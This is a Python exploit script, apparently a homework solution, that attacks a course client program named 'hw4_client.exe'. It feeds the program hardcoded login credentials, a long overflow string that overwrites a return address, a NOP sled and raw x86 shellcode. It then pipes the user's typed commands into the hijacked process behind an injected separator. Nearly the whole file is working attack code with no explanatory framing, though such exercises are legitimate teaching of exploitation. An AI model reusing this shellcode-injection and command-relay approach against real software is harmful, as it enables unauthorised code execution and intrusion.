from subprocess import run, Popen, STDOUT, PIPE
from time import sleep

if __name__ == '__main__':
    # fw_in = open("input.txt","wb")
    # fr_in = open("input.txt","r")
    # fw_out = open("output.txt","w")

    _cred = "archer\n2BBVAFEX2RNFB2NF\nPEEK\n"

    _overflow="\x00"+"a"*16303+"\x28\x20\x50\x62"
    input_ = _cred+_overflow
    input_list = list(bytearray(input_.encode()))


    nops_slide = [0xeb, 0x20, 0x90, 0x90, 0xe8, 0xdc, 0x5f, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90]


    injected_code =[ 0x81, 0xEC, 0xE8, 0x01, 0x00, 0x00, 0x89, 0xE3, 0x53, 0x68, 0x68, 0x61, 0x50, 0x62, 0xB8, 0xD4, 0x4B, 0x50, 0x62, 0xFF, 0xD0, 0x6A, 0x00, 0x68, 0x80, 0x80, 0x50, 0x62, 0x53, 0x6A, 0x07, 0xB8, 0x90, 0xFD, 0x5F, 0x00, 0xFF, 0x30, 0xB8, 0x92, 0x18, 0x50, 0x62, 0xFF, 0xD0, 0xE9, 0xC0, 0xFF, 0xFF, 0xFF ]

    input_list += nops_slide+ injected_code +[0xa]
    #for debug
    # print("the injected code is in length:")
    # print(len(injected_code))
    # fw_in.write(bytearray(input_list))

    p=Popen(["hw4_client.exe"], stdin=PIPE)
    p.stdin.write(bytearray(input_list))
    p.stdin.flush()
    try:
        while True:
            usr_input = input()
            if usr_input=='exit':
                p.kill()
                exit(0)
            usr_input='\n' +"*. ; "+ usr_input + '\n'
            p.stdin.flush()

            p.stdin.write(bytearray(usr_input.encode()))
            p.stdin.flush()

            sleep(1)
    except EOFError as e:
            print("\nI dont like txt files!!!, remove the .txt extension")
            p.kill()
            exit(1)
